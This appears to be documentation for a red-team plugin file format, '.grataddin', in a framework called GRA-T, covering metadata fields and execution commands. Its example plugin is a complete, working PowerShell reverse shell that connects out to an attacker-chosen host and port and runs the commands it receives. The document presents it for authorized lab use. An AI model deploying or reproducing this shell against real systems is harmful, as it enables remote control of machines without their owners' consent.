# 📜 GRA-T Addin (.grataddin) Plugin Documentation

`.grataddin` files are structured plugin scripts for the **GRA-T** framework and **GRA-T Editor**, designed for modular red team automation and post-exploitation workflows.

---

## ⚙️ Structure of a `.grataddin`

A plugin file must contain:

1️⃣ **Structured Metadata Header:**
```plaintext
# plugin.name: ReverseShell
# plugin.description: A PowerShell reverse shell plugin
# plugin.lang: powershell
# plugin.ositworkswith: windows
# plugin.commands: /plugin use ReverseShell LHOST=1.2.3.4 LPORT=4444
# plugin.args: LHOST:str LPORT:int
````

2️⃣ **Logic Body:**

The actual script logic in the specified language (`python`, `powershell`, `batch`, `bash`).

---

## 🛠️ Metadata Fields

| Field                  | Required    | Description                                       |
| ---------------------- | ----------- | ------------------------------------------------- |
| `plugin.name`          | ✅           | Unique plugin identifier                          |
| `plugin.description`   | ✅           | Short description of functionality                |
| `plugin.lang`          | ✅           | `python`, `powershell`, `batch`, or `bash`        |
| `plugin.ositworkswith` | ✅           | `windows` or `linux`                              |
| `plugin.commands`      | ✅           | Example usage in GRA-T                            |
| `plugin.args`          | ✅ if needed | Space-separated arguments with types (`ARG:type`) |

---

## 🖥️ Execution

### Testing Plugins

Plugins can be:

* Tested within **GRA-T Editor**:

  * Prompt for arguments defined in `plugin.args`.
  * Execute inside the IDE terminal using the selected shell.
* Deployed within **GRA-T** using:

  ```
  /plugin import your_plugin.grataddin
  /plugin use PluginName ARG1=val1 ARG2=val2
  ```

---

## 🧩 Example Plugin

**Powershell Reverse Shell Plugin:**

```powershell
# plugin.name: ReverseShell
# plugin.description: A basic PowerShell reverse shell
# plugin.lang: powershell
# plugin.ositworkswith: windows
# plugin.commands: /plugin use ReverseShell LHOST=1.2.3.4 LPORT=4444
# plugin.args: LHOST:str LPORT:int

$client = New-Object System.Net.Sockets.TCPClient($args[0], $args[1])
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2  = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

---

## ✅ Best Practices

* **Use clear names and descriptions.**
* **Validate plugins using GRA-T Editor before using in live labs.**
* **Test with known safe environments before operational use.**
* Ensure **CLI argument parsing** is present where needed.
* Keep plugins **modular and minimal** for maintainability.
* Please refrain from :

-> Doing anything that you didn't explicitly say your script will do
-> Trying to exfiltrate data from other peoples labs


---

## 🚩 Reminder

**Only use plugins under explicit authorization in controlled environments.**

---

🐐 **THE GRA-T PIPELINE IS REAL**
